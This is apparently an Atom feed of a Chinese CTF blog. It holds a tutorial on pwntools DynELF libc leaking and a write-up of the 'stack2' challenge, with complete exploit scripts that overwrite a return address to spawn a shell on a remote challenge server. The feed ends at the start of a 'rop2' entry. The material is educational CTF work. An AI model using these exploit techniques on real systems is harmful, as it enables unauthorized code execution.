<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xfgg</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-07-30T02:23:54.260Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>xfgg</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>DynELF的应用</title>
    <link href="http://yoursite.com/2019/07/30/DynELF%E7%9A%84%E5%BA%94%E7%94%A8/"/>
    <id>http://yoursite.com/2019/07/30/DynELF的应用/</id>
    <published>2019-07-30T02:17:49.135Z</published>
    <updated>2019-07-30T02:23:54.260Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>原文：<a href="http://bobao.360.cn/learning/detail/3298.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3298.html</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在没有目标系统libc文件的情况下，我们可以使用pwntools的DynELF模块来泄漏地址信息，从而获取到shell。本文针对linux下的puts和write，分别给出了实现DynELF关键函数leak的方法，并通过3道CTF题目介绍了这些方法的具体应用情况。</span><br></pre></td></tr></table></figure><h3 id="DynELF"><a href="#DynELF" class="headerlink" title="DynELF"></a>DynELF</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">DynELF是pwntools中专门用来应对无libc情况的漏洞利用模块，其基本代码框架如下。</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./xxx'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def leak(address):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">#各种预处理</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  payload = <span class="string">"xxxxxxxx"</span> + address + <span class="string">"xxxxxxxx"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">#各种处理</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  data = p.recv(4)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  log.debug(<span class="string">"%#x =&gt; %s"</span> % (address, (data or <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">"./xxx"</span>))      <span class="comment">#初始化DynELF模块 </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">systemAddress = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)  <span class="comment">#在libc文件中搜索system函数的地址</span></span><br><span class="line"></span><br><span class="line">需要使用者进行的工作主要集中在leak函数的具体实现上，上面的代码只是个模板。其中，address就是leak函数要泄漏信息的所在地址，而payload就是触发目标程序泄漏address处信息的攻击代码。</span><br></pre></td></tr></table></figure><h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">不管有没有libc文件，要想获得目标系统的system函数地址，首先都要求目标二进制程序中存在一个能够泄漏目标系统内存中libc空间内信息的漏洞。同时，由于我们是在对方内存中不断搜索地址信息，故我们需要这样的信息泄露漏洞能够被反复调用。以下是大致归纳的主要使用条件：</span><br><span class="line">1）目标程序存在可以泄露libc空间信息的漏洞，如<span class="built_in">read</span>@got就指向libc地址空间内；</span><br><span class="line"></span><br><span class="line">2）目标程序中存在的信息泄露漏洞能够反复触发，从而可以不断泄露libc地址空间内的信息。</span><br><span class="line"></span><br><span class="line">当然，以上仅仅是实现利用的基本条件，不同的目标程序和运行环境都会有一些坑需要绕过。接下来，我们主要针对write和puts这两个普遍用来泄漏信息的函数在实际配合DynELF工作时可能遇到的问题，给出相应的解决方法。</span><br></pre></td></tr></table></figure><h3 id="write函数"><a href="#write函数" class="headerlink" title="write函数"></a>write函数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">write函数原型是write(fd, addr, len)，即将addr作为起始地址，读取len字节的数据到文件流fd（0表示标准输入流stdin、1表示标准输出流stdout）。write函数的优点是可以读取任意长度的内存信息，即它的打印长度只受len参数控制，缺点是需要传递3个参数，特别是在x64环境下，可能会带来一些困扰。</span><br><span class="line">在x64环境下，函数的参数是通过寄存器传递的，rdi对应第一个参数，rsi对应第二个参数，rdx对应第三个参数，往往凑不出类似“pop rdi; ret”、“pop rsi; ret”、“pop rdx; ret”等3个传参的gadget。此时，可以考虑使用__libc_csu_init函数的通用gadget，具体原理请参见文章。简单的说，就是通过__libc_csu_init函数的两段代码来实现3个参数的传递，这两段代码普遍存在于x64二进制程序中，只不过是间接地传递参数，而不像原来，是通过pop指令直接传递参数。</span><br><span class="line"></span><br><span class="line">.text:000000000040075A   pop  rbx  <span class="comment">#需置为0，为配合第二段代码的call指令寻址</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:000000000040075B   pop  rbp  <span class="comment">#需置为1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:000000000040075C   pop  r12  <span class="comment">#需置为要调用的函数地址，注意是got地址而不是plt地址，因为第二段代码中是call指令</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:000000000040075E   pop  r13  <span class="comment">#write函数的第三个参数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:0000000000400760   pop  r14  <span class="comment">#write函数的第二个参数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:0000000000400762   pop  r15  <span class="comment">#write函数的第一个参数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:0000000000400764   retn</span><br><span class="line"></span><br><span class="line">第二段代码如下</span><br><span class="line"></span><br><span class="line">.text:0000000000400740   mov  rdx, r13</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:0000000000400743   mov  rsi, r14</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:0000000000400746   mov  edi, r15d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:0000000000400749   call  qword ptr [r12+rbx*8]</span><br><span class="line"></span><br><span class="line">这两段代码运行后，会将栈顶指针移动56字节，我们在栈中布置56个字节即可。</span><br><span class="line"></span><br><span class="line">这样，我们便解决了write函数在leak信息中存在的问题，具体的应用会放到后面的3道题目中讲。</span><br></pre></td></tr></table></figure><h3 id="puts函数"><a href="#puts函数" class="headerlink" title="puts函数"></a>puts函数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">puts的原型是puts(addr)，即将addr作为起始地址输出字符串，直到遇到“\x00”字符为止。也就是说，puts函数输出的数据长度是不受控的，只要我们输出的信息中包含\x00截断符，输出就会终止，且会自动将“\n”追加到输出字符串的末尾，这是puts函数的缺点，而优点就是需要的参数少，只有1个，无论在x32还是x64环境下，都容易调用。</span><br><span class="line">为了克服输入不受控这一缺点，我们考虑利用puts函数输出的字符串最后一位为“\n“这一特点，分两种情况来解决。</span><br><span class="line"></span><br><span class="line">（1）puts输出完后就没有其他输出，在这种情况下的leak函数可以这么写。</span><br><span class="line"></span><br><span class="line">def leak(address):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  count = 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  data = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  payload = xxx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span> p.recvuntil(<span class="string">'xxx\n'</span>) <span class="comment">#一定要在puts前释放完输出</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  up = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> True:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#由于接收完标志字符串结束的回车符后，就没有其他输出了，故先等待1秒钟，如果确实接收不到了，就说明输出结束了</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#以便与不是标志字符串结束的回车符（0x0A）混淆，这也利用了recv函数的timeout参数，即当timeout结束后仍得不到输出，则直接返回空字符串””</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    c = p.recv(numb=1, timeout=1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    count += 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> up == <span class="string">'\n'</span> and c == <span class="string">""</span>:  <span class="comment">#接收到的上一个字符为回车符，而当前接收不到新字符，则</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      buf = buf[:-1]             <span class="comment">#删除puts函数输出的末尾回车符</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      buf += <span class="string">"\x00"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="built_in">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      buf += c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    up = c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  data = buf[:4]  <span class="comment">#取指定字节数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  log.info(<span class="string">"%#x =&gt; %s"</span> % (address, (data or <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">return</span> data</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">puts输出完后还有其他输出，在这种情况下的leak函数可以这么写。</span><br><span class="line"></span><br><span class="line">def leak(address):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  count = 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  data = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  payload = xxx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span> p.recvuntil(<span class="string">"xxx\n"</span>)) <span class="comment">#一定要在puts前释放完输出</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  up = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> True:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    c = p.recv(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    count += 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> up == <span class="string">'\n'</span> and c == <span class="string">"x"</span>:  <span class="comment">#一定要找到泄漏信息的字符串特征</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      data = buf[:-1]                     </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      data += <span class="string">"\x00"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="built_in">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      buf += c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    up = c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  data = buf[:4] </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  log.info(<span class="string">"%#x =&gt; %s"</span> % (address, (data or <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">return</span> data</span><br></pre></td></tr></table></figure><h3 id="其他需要注意的"><a href="#其他需要注意的" class="headerlink" title="其他需要注意的"></a>其他需要注意的</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在信息泄露过程中，由于循环制造溢出，故可能会导致栈结构发生不可预料的变化，可以尝试调用目标二进制程序的_start函数来重新开始程序以恢复栈</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;原文：&lt;a href=&quot;http://bobao.360.cn/learning/detail/3298.html&quot; target=&quot;_bl
      
    
    </summary>
    
      <category term="理论知识" scheme="http://yoursite.com/categories/%E7%90%86%E8%AE%BA%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>stack2</title>
    <link href="http://yoursite.com/2019/07/28/stack2/"/>
    <id>http://yoursite.com/2019/07/28/stack2/</id>
    <published>2019-07-28T12:07:22.150Z</published>
    <updated>2019-07-30T02:18:09.749Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">xfgg@ubuntu:~/Downloads$ checksec stack2</span><br><span class="line">[*] <span class="string">'/home/xfgg/Downloads/stack2'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line"></span><br><span class="line">    可能要用到canary绕过</span><br><span class="line">    ida分析</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190122193700704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMDcxNjQ2,size_16,color_FFFFFF,t_70" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">限制了 输入的数量是99</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190122193737266.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMDcxNjQ2,size_16,color_FFFFFF,t_70" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这里就是bug了    因为我们没有检查v13数组的边界 这里我们可以随意输入  然后劫持程序eip  </span><br><span class="line"></span><br><span class="line">然后观察 哪里有system_addr   就ok了 但是 这里输入的是数字 好像有点麻烦</span><br><span class="line"></span><br><span class="line">因为v13 是char 类型的数组 然后我们试着输入一下</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190123100418248.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMDcxNjQ2,size_16,color_FFFFFF,t_70" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后去栈会发现,这个操作可以用gdb一步步ni下去</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190123100437224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMDcxNjQ2,size_16,color_FFFFFF,t_70" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">这里其实应该能够注意得到  栈是小段模式  那么我们输入的时候 可以是 反着来  比如地址是 12345678  先输入78 45 34  12  </span><br><span class="line"></span><br><span class="line">才能返回 正确的地址 然后 我们观察一下 哪里有我们system 的地址    </span><br><span class="line"></span><br><span class="line">然后我们发现 本次（这个是会变化的  注意是我这次 运行的） 我们的返回地址FFCF77AC  而我们输入的地址是   FFCF7728  </span><br><span class="line"></span><br><span class="line">那么偏移就是 0x84  然后之后我们找到 system_addr 就ok了  </span><br><span class="line"></span><br><span class="line">然后就找到了  system_addr</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190123101625553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMDcxNjQ2,size_16,color_FFFFFF,t_70" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> 但是感觉这里/bin/bash 有点怪怪的啊~~~</span><br><span class="line"></span><br><span class="line">先不管 我们试试</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"> </span><br><span class="line">from pwn import*</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">system_addr=0x080485AF</span><br><span class="line">leave_offset=0x84</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def write_addr(addr,va):</span><br><span class="line">io.sendline(<span class="string">"3"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"which number to change:\n"</span>)</span><br><span class="line">io.sendline(str(addr))</span><br><span class="line">io.recvuntil(<span class="string">"new number:\n"</span>)</span><br><span class="line">io.sendline(str(va))</span><br><span class="line">io.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line"> </span><br><span class="line">io=remote(<span class="string">'111.198.29.45'</span>,<span class="string">'31725'</span>)</span><br><span class="line">io.recvuntil(<span class="string">"How many numbers you have:\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"1"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"Give me your numbers\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"1"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># write  system_addr</span></span><br><span class="line"> </span><br><span class="line">write_addr(leave_offset,0XAF)</span><br><span class="line">write_addr(leave_offset+1,0X85)</span><br><span class="line">write_addr(leave_offset+2,0X04)</span><br><span class="line">write_addr(leave_offset+3,0X08)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">io.sendline(<span class="string">"5"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于题目的问题所以需要我们自己写入sh</span><br></pre></td></tr></table></figure><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">数组下标超界问题</span><br></pre></td></tr></table></figure><p>###exp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"> </span><br><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">system_addr=0x080485AF</span><br><span class="line">leave_offset=0x84</span><br><span class="line">io = remote(<span class="string">'111.198.29.45'</span>,<span class="string">'47978'</span>) </span><br><span class="line"></span><br><span class="line">def write_addr(addr,va):</span><br><span class="line">io.sendline(<span class="string">"3"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"which number to change:\n"</span>)</span><br><span class="line">io.sendline(str(addr))</span><br><span class="line">io.recvuntil(<span class="string">"new number:\n"</span>)</span><br><span class="line">io.sendline(str(va))</span><br><span class="line">io.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">"How many numbers you have:\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"1"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"Give me your numbers\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"1"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write  system_addr  0x08048450</span></span><br><span class="line"> </span><br><span class="line">write_addr(leave_offset,0X50)</span><br><span class="line">write_addr(leave_offset+1,0X84)</span><br><span class="line">write_addr(leave_offset+2,0X04)</span><br><span class="line">write_addr(leave_offset+3,0X08)</span><br><span class="line"><span class="comment"># sh_addr  0x08048987</span></span><br><span class="line">leave_offset+=8</span><br><span class="line"><span class="built_in">print</span> leave_offset</span><br><span class="line">write_addr(leave_offset,0x87)</span><br><span class="line">write_addr(leave_offset+1,0X89)</span><br><span class="line">write_addr(leave_offset+2,0X04)</span><br><span class="line">write_addr(leave_offset+3,0X08)</span><br><span class="line"> </span><br><span class="line">io.sendline(<span class="string">"5"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-寻找漏洞&quot;&gt;&lt;a href=&quot;#0x01-寻找漏洞&quot; class=&quot;headerlink&quot; title=&quot;0x01 寻找漏洞&quot;&gt;&lt;/a&gt;0x01 寻找漏洞&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td
      
    
    </summary>
    
      <category term="攻防世界" scheme="http://yoursite.com/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>rop2</title>
    <link href="http://yoursite.com/2019/07/28/rop2/"/>
    <id>http://yoursite.com/2019/07/28/rop2/</id>
    <published>2019-07-28T11:46:21.869Z</published>
    <updated>2019-07-28T11:55:45.726Z</updated>
    
